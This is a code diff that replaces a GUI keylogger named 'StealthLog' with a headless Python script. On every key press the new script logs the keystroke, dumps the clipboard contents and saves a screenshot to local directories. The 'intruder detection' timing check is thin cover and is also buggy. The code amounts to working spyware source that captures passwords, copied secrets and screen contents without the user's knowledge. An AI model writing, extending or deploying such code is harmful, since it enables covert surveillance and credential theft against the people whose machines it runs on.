@@ -1,94 +1,72 @@
+import os
+import time
+import datetime
+import pyautogui
+import clipboard
 import pynput
 from pynput.keyboard import Key, Listener
-import tkinter as tk
-from tkinter import ttk
-import os
-from shutil import copyfile
-from datetime import datetime
+from pynput.mouse import Controller
 
-class StealthLog:
-    def __init__(self, master):
-        self.master = master
-        self.keys = []
-        self.log_file = tk.StringVar()
-        self.current_log_file = "log.txt"
-        self.last_saved_timestamp = None
+# Set up logging
+log_dir = "/path/to/log/directory"
+log_filename = "keylogger-" + datetime.datetime.now().strftime("%Y-%m-%d-%H%M%S") + ".txt"
+log_file = open(os.path.join(log_dir, log_filename), "w")
 
-        self.master.title("StealthLog - Keylogger Tool")
+# Set up clipboard logging
+clipboard_log = "/path/to/clipboard/log/directory/clipboard.log"
+clipboard_log_file = open(clipboard_log, "a")
 
-        self.log_label = ttk.Label(master, textvariable=self.log_file)
-        self.log_label.pack()
+# Set up screenshot directory
+screenshot_dir = "/path/to/screenshot/directory"
 
-        self.start_button = ttk.Button(master, text="Start", command=self.start)
-        self.start_button.pack()
+# Set up mouse controller
+mouse = Controller()
 
-        self.stop_button = ttk.Button(master, text="Stop", state=tk.DISABLED, command=self.stop)
-        self.stop_button.pack()
+# Set up typing rhythm detection
+typing_rhythm_threshold = 0.15
+keystroke_times = []
+last_keystroke_time = time.time()
 
-        self.save_location_button = ttk.Button(master, text="Change Save Location", command=self.change_save_location)
-        self.save_location_button.pack()
+def on_press(key):
+    # Log the keystroke
+    try:
+        log_file.write(str(key.char))
+    except AttributeError:
+        log_file.write("{0}".format(key))
 
-        self.clear_log_button = ttk.Button(master, text="Clear Log", command=self.clear_log)
-        self.clear_log_button.pack()
+    # Log the clipboard content
+    clipboard_content = clipboard.paste()
+    clipboard_log_file.write(str(time.time()) + " " + clipboard_content + "\n")
 
-    def start(self):
-        self.start_button.config(state=tk.DISABLED)
-        self.stop_button.config(state=tk.NORMAL)
+    # Take a screenshot
+    screenshot = pyautogui.screenshot()
+    screenshot.save(os.path.join(screenshot_dir, "screenshot-" + datetime.datetime.now().strftime("%Y-%m-%d-%H%M%S") + ".png"))
 
-        self.log_file.set("")
+    # Add the keystroke time to the list
+    keystroke_times.append(time.time() - last_keystroke_time)
 
-        def on_press(key):
-            self.keys.append(key)
-            self.update_log()
+    # Calculate the average typing rhythm
+    if len(keystroke_times) > 10:
+        keystroke_times.pop(0)
+        avg_rhythm = sum(keystroke_times) / len(keystroke_times)
 
-        def on_release(key):
-            if key == Key.esc:
-                return False
+        # Calculate the standard deviation of the typing rhythm
+        rhythm_squares = [(x - avg_rhythm) ** 2 for x in keystroke_times]
+        rhythm_stddev = (sum(rhythm_squares) / len(keystroke_times)) ** 0.5
 
-        with Listener(on_press=on_press, on_release=on_release) as listener:
-            listener.join()
+        # Check if the user's typing rhythm has changed significantly
+        if abs(avg_rhythm - typing_rhythm_threshold) > rhythm_stddev:
+            print("Warning: Possible intruder detected.")
 
-    def stop(self):
-        self.start_button.config(state=tk.NORMAL)
-        self.stop_button.config(state=tk.DISABLED)
+    last_keystroke_time = time.time()
 
-        # Save the log file with a new name and timestamp
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        backup_log = f"{self.current_log_file[:-4]}_{timestamp}.txt"
-        copyfile(self.current_log_file, backup_log)
+def on_release(key):
+    pass
 
-        with open(self.current_log_file, 'w') as f:
-            for key in self.keys:
-                if isinstance(key, Key):
-                    continue
-                f.write(str(key))
-                f.write('\n')
+# Start the keylogger
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
 
-        self.keys = []
-        self.update_log()
-        self.last_saved_timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-
-    def update_log(self):
-        with open(self.current_log_file, 'r') as f:
-            log = f.read()
-        self.log_file.set(log)
-
-    def change_save_location(self):
-        save_location = tk.filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt")])
-        if save_location:
-            self.current_log_file = save_location
-
-    def clear_log(self):
-        if self.last_saved_timestamp:
-            os.remove(self.current_log_file)
-            self.current_log_file = f"{self.current_log_file[:-4]}_{self.last_saved_timestamp}.txt"
-
-        with open(self.current_log_file, 'w') as f:
-            f.write("")
-
-        self.keys = []
-        self.update_log()
-
-root = tk.Tk()
-app = StealthLog(root)
-root.mainloop()
+# Close the log files
+log_file.close()
+clipboard_log_file.close()
